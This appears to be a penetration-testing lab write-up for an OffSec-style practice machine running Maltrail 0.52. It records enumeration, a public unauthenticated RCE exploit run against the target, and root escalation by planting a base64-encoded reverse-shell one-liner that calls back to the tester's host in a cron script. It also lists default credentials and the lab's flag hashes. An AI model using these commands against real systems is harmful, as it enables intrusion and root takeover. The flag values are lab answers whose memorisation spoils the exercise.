---
date: 2025-11-19
---
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 8338
- [ ] 80
- [ ] 22

# Service Enumeration
## 8338
![[Pasted image 20251119193606.png]]
Maltrail (v0.52)

Tried guessing logins and failed:
- admin:admin
- ochima:ochima

![[Pasted image 20251119193754.png]]

We discover some interesting directories, but they don't actually give a meaningful response when checking manually:
![[Pasted image 20251119193926.png]]


Uninteresting robots.txt
![[Pasted image 20251119193957.png]]

Maltrail 0.53 and below has a vulnerability allowing for unauthenticated RCE:
https://github.com/spookier/Maltrail-v0.53-Exploit

... there is also a metasploit module: https://www.rapid7.com/db/modules/exploit/unix/http/maltrail_rce/

Using the github exploit:
`python3 exploit.py 192.168.45.170 80 http://ochima:8338/`
*Failed with on port 4444 at first so switched to 80 and it succeeded.*

![[Pasted image 20251119201709.png]]

# Privilege Escalation

/opt/maltrail-0.53/maltrail.conf contains default credentials for maltrail:

changeme!
![[Pasted image 20251119201931.png]]

I notice some non-default cron activity when observing processes with pspy. It's running as root, so definitely of interest to us.
![[Pasted image 20251119203014.png]]

Let's check the script being ran:
![[Pasted image 20251119203120.png]]
oop

We can simply edit the etc_Backup.sh script to add reverse shell payload such as:
`printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzAvODAgMD4mMSkgJg==|base64 -d|bash`

After waiting a moment, I received a connection on my listener as root.
# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/root/proof.txt
5431389a69a7b442b26f1d803c46b4b0

/home/snort/local.txt
30ca25c17bb17e3604882e9b22838ea9

![[Pasted image 20251119203853.png]]